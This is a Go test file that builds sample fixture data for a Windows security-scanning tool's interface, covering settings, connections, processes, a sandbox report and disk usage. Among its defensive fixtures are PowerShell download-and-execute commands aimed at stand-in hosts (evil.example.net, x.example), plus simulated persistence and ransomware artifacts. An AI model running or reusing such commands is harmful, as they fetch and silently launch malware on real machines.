package main

import (
	"encoding/json"
	"math"
	"os"
	"strings"
	"testing"
	"time"
)

// Genera datos de ejemplo con los mismos constructores que el programa, para probar la
// interfaz en un navegador (BS_FIXTURES=/ruta/fixtures.json go test -run Fixtures).
func TestFixtures(t *testing.T) {
	out := os.Getenv("BS_FIXTURES")
	if out == "" {
		t.Skip()
	}
	st := NewStore(t.TempDir())
	e := NewEngine(st)
	var s SecInfo
	json.Unmarshal([]byte(`{"av":[{"name":"Windows Defender","state":397568}],"defPresent":true,"defEnabled":true,"defRT":true,"defSigAge":9,"defTamper":false,"cfa":0,"fw":[{"Name":"Domain","Enabled":true},{"Name":"Private","Enabled":true},{"Name":"Public","Enabled":false}],"bl":0,"lua":1,"consent":5,"smb1":true,"rdpDeny":0,"rdpNla":1,"secureBoot":true,"reboot":true,"wdigest":0,"ppl":0,"autorun":0,"psv2":"Enabled","lmcompat":5}`), &s)
	e.AddScanner(Scanner{Name: "seg", Run: func(e *Engine) ([]*Item, error) { return BuildSecurity(s), nil }})
	e.AddScanner(Scanner{Name: "prog", Run: func(e *Engine) ([]*Item, error) {
		return BuildPrograms(ParseWingetTable(wingetES), []KEVEntry{{CVE: "CVE-2026-0001", Vendor: "Google", Product: "Chrome", Added: "2026-11-01"}}), nil
	}})
	e.AddScanner(Scanner{Name: "red", Run: func(e *Engine) ([]*Item, error) {
		l := BuildListeners([]Listener{{Addr: "0.0.0.0", Port: 3389, Proto: "TCP", Proc: "svchost"}, {Addr: "0.0.0.0", Port: 7680, Proto: "TCP", Proc: "svchost"}})
		l = append(l, BuildIntrusions([]FailedLogon{{IP: "203.0.113.5", User: "admin", Count: 40, Last: "2026-11-22 03:10"}})...)
		return l, nil
	}})
	e.AddScanner(Scanner{Name: "otros", Run: func(e *Engine) ([]*Item, error) {
		l := BuildJunk([]JunkDir{{ID: "usertemp", Bytes: 2 << 30}, {ID: "wudl", Bytes: 700 << 20}, {ID: "recycle", Bytes: 90 << 20}})
		w := 12
		l = append(l, BuildHardware(HWInfo{Disks: []DiskHW{{Name: "Samsung SSD 980", Media: "SSD", Health: "Healthy", Size: 1 << 40, Wear: &w}}, BatDesign: 50000, BatFull: 41000, SysFree: 120 << 30, SysSize: 476 << 30})...)
		l = append(l, BuildEvents([]EvGroup{{Kind: "power41", Count: 2, Last: "2026-11-20 10:00"}, {Kind: "appcrash", Count: 4, Last: "2026-11-21 12:00", Extra: "Programas: Teams.exe (4)"}})...)
		l = append(l, BuildChanges([]PersistEntry{{Kind: "task", Name: `\Updater`, Cmd: `powershell -enc AAAA`}}, map[string]bool{})...)
		return l, nil
	}})
	e.Scan(false)
	st.AddScore(71)
	st.AddScore(78)
	st.AddHist(HistEntry{Name: "7-Zip", WingetID: "7zip.7zip", Source: "manual", From: "23.01", To: "24.08", Result: "OK"})
	bad := `$c=New-Object Net.WebClient; $c.DownloadFile('http://evil.example.net/a.exe',"$env:TEMP\a.exe"); Start-Process "$env:TEMP\a.exe" -WindowStyle Hidden`
	fa := AnalyzeBytes(`C:\Users\ana\Downloads\factura.ps1`, []byte(bad), int64(len(bad)))
	fa.Path = `C:\Users\ana\Downloads\factura.ps1`
	fa.Intel = []string{"Team Cymru", "AlienVault OTX", "CIRCL hashlookup"}
	fa.Reputation, fa.Defender, fa.Origin, fa.Signature = "No aparece en las bases de malware consultadas", "Sin amenazas", "Internet (https://mail.example.com)", "Sin firmar"
	now := time.Now().UnixMilli()
	conns := []Conn{
		{Proc: "chrome", PID: 3100, Path: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Proto: "TCP", Local: "192.168.1.20:52011", Remote: "142.250.1.1:443", Host: "mad07s.1e100.net", State: "Conectada", Org: "Google", CC: "US"},
		{Proc: "chrome", PID: 3100, Path: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Proto: "TCP", Local: "192.168.1.20:52012", Remote: "104.16.132.229:443", State: "Conectada", Org: "Cloudflare", CC: "US"},
		{Proc: "chrome", PID: 3100, Path: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Proto: "TCP", Local: "192.168.1.20:52013", Remote: "151.101.1.69:80", State: "Conectando", Org: "Fastly", CC: "SE"},
		{Proc: "Spotify", PID: 4100, Path: `C:\Users\ana\AppData\Roaming\Spotify\Spotify.exe`, Proto: "TCP", Local: "192.168.1.20:52100", Remote: "35.186.224.25:443", State: "Conectada", Org: "Google", CC: "US"},
		{Proc: "svchost", PID: 1200, Path: `C:\Windows\System32\svchost.exe`, Proto: "TCP", Local: "192.168.1.20:52200", Remote: "20.42.65.92:443", State: "Conectada", Org: "Microsoft", CC: "IE"},
		{Proc: "svchost", PID: 1200, Path: `C:\Windows\System32\svchost.exe`, Proto: "TCP", Local: "192.168.1.20:445", Remote: "192.168.1.35:51022", State: "Conectada"},
		{Proc: "OneDrive", PID: 5300, Path: `C:\Users\ana\AppData\Local\Microsoft\OneDrive\OneDrive.exe`, Proto: "TCP", Local: "[2a0c::5]:52300", Remote: "[2603:1026::12]:443", State: "Conectada", Org: "Microsoft", CC: "NL", IPv6: true},
		{Proc: "svchost", Path: `C:\Users\ana\AppData\Roaming\svchost.exe`, PID: 5100, Proto: "TCP", Local: "192.168.1.20:52400", Remote: "198.51.100.7:4444", State: "Conectada", CC: "RU"},
	}
	for i := range conns {
		h, p := SplitHostPort(conns[i].Remote)
		ClassifyConn(&conns[i], h, p)
		conns[i].Cat = AppCategory(conns[i].Proc, conns[i].Path)
		conns[i].SvcCat = SvcCategory(p)
		conns[i].Dir = "sale"
		conns[i].Since = now - int64(i*40000)
	}
	conns[5].Dir, conns[5].Svc, conns[5].SvcCat = "entra", "SMB (entrante)", "Archivos compartidos"
	var hist []TPoint
	for i := 0; i < 120; i++ {
		f := float64(i)
		hist = append(hist, TPoint{T: now - int64(120-i)*1000, In: 80000 + 60000*math.Sin(f/9) + float64((i*37)%50)*900, Out: 9000 + 6000*math.Cos(f/7)})
	}
	fx := map[string]any{
		"init":    map[string]any{"version": AppVersion, "computer": "PC-CASA", "admin": true, "portable": false, "company": false, "settings": st.Cfg.Settings, "projects": []string{}, "domains": []string{}, "backups": []string{}, "updateURL": "", "server": st.Cfg.Server, "theme": "light", "saved": true, "fresh": true},
		"state":   e.State(-1, 0),
		"history": e.History(),
		"scoreh":  st.Pts,
		"plan":    e.Plan([]string{"sec:fw:Public", "w:Google.Chrome"}),
		"fa":      fa,
		"pw":      PasswordStrength("Verano2024"),
		"pwned":   PwnedOut{Count: 1234},
		"breach":  parseXON([]byte(`{"ExposedBreaches":{"breaches_details":[{"breach":"Canva","domain":"canva.com","industry":"Information","password_risk":"hardtocrack","xposed_data":"Email addresses;Names;Passwords","xposed_date":"2019","xposed_records":137272116,"verified":"Yes"}]}}`)),
		"traffic": TrafficOut{Conns: conns, Internet: 7, Procs: 5, InBps: 120000, OutBps: 8000, Hist: hist, PeakIn: 160000, PeakOut: 15000, Listen: 12},
		"report":  BuildReportHTML(e.Items(), "PC-CASA", true),
		"procs":   procFixture(),
		"sandbox": sandboxFixture(),
		"disk":    diskFixture(),
	}
	b, _ := json.MarshalIndent(fx, "", " ")
	os.WriteFile(out, b, 0o644)
}

func procFixture() ProcOut {
	rows := []ProcRow{
		{PID: 4, Name: "System"},
		{PID: 900, PPID: 4, Name: "services.exe", Path: `C:\Windows\System32\services.exe`, Signed: "Microsoft", Signer: "Microsoft Windows", User: "SYSTEM", Mem: 9 << 20},
		{PID: 1200, PPID: 900, Name: "svchost.exe", Path: `C:\Windows\System32\svchost.exe`, Signed: "Microsoft", User: "SYSTEM", Mem: 30 << 20, CPU: 0.4},
		{PID: 3000, Name: "explorer.exe", Path: `C:\Windows\explorer.exe`, Signed: "Microsoft", User: `PC-CASA\usuario`, Mem: 140 << 20, CPU: 1.2, Desc: "Explorador de Windows"},
		{PID: 3100, PPID: 3000, Name: "chrome.exe", Path: `C:\Program Files\Google\Chrome\Application\chrome.exe`, Signed: "Firmado", Signer: "Google LLC", User: `PC-CASA\usuario`, Mem: 420 << 20, CPU: 6.5, Conns: 24, Desc: "Google Chrome", Company: "Google LLC"},
		{PID: 3300, PPID: 3000, Name: "obs64.exe", Path: `C:\Program Files\obs-studio\bin\64bit\obs64.exe`, Signed: "Firmado", Signer: "OBS Project", User: `PC-CASA\usuario`, Mem: 300 << 20, CPU: 3.1, Desc: "OBS Studio"},
		{PID: 5100, PPID: 3000, Name: "svchost.exe", Path: `C:\Users\usuario\AppData\Roaming\svchost.exe`, Signed: "Sin firmar", User: `PC-CASA\usuario`, Mem: 12 << 20, Conns: 1, Cmd: `"C:\Users\usuario\AppData\Roaming\svchost.exe" -k net`},
		{PID: 5200, PPID: 3000, Name: "setup.exe", Path: `C:\Users\usuario\Downloads\setup.exe`, Signed: "Sin firmar", User: `PC-CASA\usuario`, Mem: 8 << 20},
	}
	out := ProcOut{Total: len(rows)}
	for i := range rows {
		ClassifyProc(&rows[i])
		if rows[i].Flag != "" {
			out.Flagged++
		}
		if rows[i].Signed == "Sin firmar" {
			out.Unsigned++
		}
		if rows[i].Conns > 0 {
			out.Net++
		}
	}
	out.Procs = ProcTree(rows)
	return out
}

func sandboxFixture() SBResult {
	rep := SBReport{Name: "factura.js", Seconds: 60, Opened: true, DecoysTotal: 20, DecoysChanged: 12, NewInDocs: []string{"README_DECRYPT.txt"}, Shots: 8,
		Procs: []SBProc{
			{PID: 20, PPID: 1, Name: "wscript.exe", Cmd: `"C:\Windows\System32\WScript.exe" "C:\Users\WDAGUtilityAccount\Desktop\factura.js"`, T: 0.8},
			{PID: 21, PPID: 20, Name: "powershell.exe", Cmd: `powershell -w hidden -c (New-Object Net.WebClient).DownloadFile('http://x.example/a.exe','a.exe'); Start-Process a.exe`, T: 1.9},
			{PID: 22, PPID: 21, Name: "a.exe", Path: `C:\Users\WDAGUtilityAccount\AppData\Local\Temp\a.exe`, T: 4.2},
			{PID: 30, PPID: 1, Name: "WmiPrvSE.exe", T: 0.2}},
		Files: []SBFile{{P: `C:\Users\WDAGUtilityAccount\AppData\Local\Temp\a.exe`, S: 53248}, {P: `C:\Users\WDAGUtilityAccount\Documents\Presupuesto_1.docx.locked`, S: 2048}}}
	rep.RunNew = append(rep.RunNew, struct {
		K string `json:"k"`
		V string `json:"v"`
	}{`HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Updater`, `C:\Users\WDAGUtilityAccount\AppData\Local\Temp\a.exe`})
	return BuildDynamic(rep, "script")
}

// Disco de ejemplo con rutas de Windows (sin tocar el sistema de archivos).
func diskFixture() map[string]any {
	GB, MB := int64(1<<30), int64(1<<20)
	now := time.Now().Unix()
	old := time.Now().AddDate(0, -4, 0).Unix()
	root := &DNode{Name: `C:\`, Path: `C:\`}
	var mk func(parent *DNode, rel string, own int64, files []DFile) *DNode
	mk = func(parent *DNode, rel string, own int64, files []DFile) *DNode {
		cur := parent
		for _, part := range strings.Split(rel, `\`) {
			var found *DNode
			for _, k := range cur.Kids {
				if k.Name == part {
					found = k
				}
			}
			if found == nil {
				found = &DNode{Name: part, Path: strings.TrimSuffix(cur.Path, `\`) + `\` + part, Parent: cur, MTime: now}
				cur.Kids = append(cur.Kids, found)
			}
			cur = found
		}
		cur.Own += own
		cur.Files += int64(len(files)) + own/(4*MB) + 1
		cur.Big = append(cur.Big, files...)
		for _, f := range files {
			cur.Own += f.Size
		}
		return cur
	}
	mk(root, `Windows\System32`, 9*GB, nil)
	mk(root, `Windows\WinSxS`, 11*GB, nil)
	mk(root, `Windows\SoftwareDistribution\Download`, 2*GB, nil)
	mk(root, `Windows\Temp`, 700*MB, nil)
	mk(root, `Program Files\NVIDIA Corporation`, 3*GB, nil)
	mk(root, `Program Files\obs-studio`, 600*MB, nil)
	mk(root, `Program Files (x86)\Steam\steamapps\common\Cyberpunk 2077`, 70*GB, nil)
	mk(root, `Program Files (x86)\Steam\steamapps\shadercache`, 4*GB, nil)
	mk(root, `ProgramData\NVIDIA Corporation\Downloader`, 1800*MB, nil)
	mk(root, `$Recycle.Bin\S-1-5-21-1-1001`, 553*MB, nil)
	mk(root, `Users\usuario\AppData\Local\Temp`, 3*GB, nil)
	mk(root, `Users\usuario\AppData\Local\Google\Chrome\User Data\Default\Cache\Cache_Data`, 1200*MB, nil)
	mk(root, `Users\usuario\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache`, 300*MB, nil)
	mk(root, `Users\usuario\AppData\Local\NVIDIA\DXCache`, 900*MB, nil)
	mk(root, `Users\usuario\AppData\Local\npm-cache`, 1500*MB, nil)
	mk(root, `Users\usuario\AppData\Roaming\discord\Code Cache`, 250*MB, nil)
	mk(root, `Users\usuario\AppData\Roaming\Microsoft`, 400*MB, nil)
	mk(root, `Users\usuario\Documents`, 6*GB, []DFile{{"Proyecto final.docx", 25 * MB, now}})
	mk(root, `Users\usuario\Videos`, 0, []DFile{{"Grabacion OBS 2026-10-02.mkv", 14 * GB, old}, {"Clip partida.mp4", 3 * GB, old}})
	mk(root, `Users\usuario\Downloads`, 2*GB, []DFile{{"Win11_24H2_Spanish_x64.iso", 6 * GB, old}, {"OBS-Studio-32.1-Windows-Installer.exe", 140 * MB, old}, {"factura.pdf", 2 * MB, now}})
	mk(root, `Users\usuario\proyectos\web\node_modules`, 1100*MB, nil)
	root.Big = []DFile{{"hiberfil.sys", 13 * GB, now}, {"pagefile.sys", 16 * GB, now}, {"swapfile.sys", 256 * MB, now}}
	for _, f := range root.Big {
		root.Own += f.Size
	}
	root.Files += 3
	s := &DiskScan{Root: root, State: "listo", Took: 41, Total: 1000 * uint64(GB), Free: 120 * uint64(GB)}
	s.byPath = s.finalize(root)
	s.files.Store(612345)
	s.bytes.Store(root.Size)
	for _, p := range []string{`C:\Users\usuario\Videos\Grabacion OBS 2026-10-02.mkv`, `C:\pagefile.sys`, `C:\hiberfil.sys`, `C:\Users\usuario\Downloads\Win11_24H2_Spanish_x64.iso`, `C:\Users\usuario\Videos\Clip partida.mp4`, `C:\Users\usuario\Downloads\OBS-Studio-32.1-Windows-Installer.exe`} {
		i := strings.LastIndex(p, `\`)
		dir := p[:i]
		if dir == "C:" {
			dir = `C:\`
		}
		n := s.byPath[strings.ToLower(dir)]
		for _, f := range n.Big {
			if strings.EqualFold(f.Name, p[i+1:]) {
				s.addTop(topFile{p, f.Size, f.MTime})
			}
		}
	}
	views := map[string]any{}
	for _, p := range []string{"", `C:\Users`, `C:\Users\usuario`, `C:\Users\usuario\AppData`, `C:\Users\usuario\AppData\Local`, `C:\Users\usuario\Downloads`, `C:\Windows`, `C:\Program Files (x86)`} {
		v, _ := s.View(p)
		views[strings.ToLower(p)] = v
	}
	return map[string]any{"progress": s.Progress(), "views": views, "recs": s.Recommend(), "top": s.TopFiles(100)}
}
